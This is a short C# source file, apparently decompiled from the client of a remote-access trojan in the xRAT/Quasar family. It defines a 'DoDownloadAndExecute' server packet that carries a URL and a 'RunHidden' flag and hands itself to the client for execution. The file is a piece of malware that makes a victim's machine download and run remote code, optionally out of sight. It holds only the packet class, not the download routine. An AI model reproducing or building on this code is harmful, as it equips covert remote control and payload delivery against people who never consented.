using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoDownloadAndExecute : GInterface4
{
	public string URL { get; set; }

	public bool RunHidden { get; set; }

	public DoDownloadAndExecute()
	{
	}

	public DoDownloadAndExecute(string url, bool runhidden)
	{
		URL = url;
		RunHidden = runhidden;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
